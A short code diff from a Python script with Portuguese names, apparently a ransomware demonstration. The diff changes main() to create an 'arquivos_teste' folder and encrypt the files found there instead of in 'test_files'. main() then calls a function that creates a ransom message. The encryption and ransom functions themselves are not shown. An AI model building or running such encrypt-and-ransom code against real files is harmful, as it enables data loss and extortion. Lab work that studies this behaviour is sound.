@@ -39,9 +39,10 @@ def criar_mensagem_resgate():
 
 #6. Execução principal
 def main():
+    os.makedirs("arquivos_teste", exist_ok=True) 
     gerar_chave()
     chave = carregar_chave()
-    arquivos = encontrar_arquivos("test_files")
+    arquivos = encontrar_arquivos("arquivos_teste")
     for arquivo in arquivos:
         criptografar_arquivo(arquivo, chave)
     criar_mensagem_resgate()
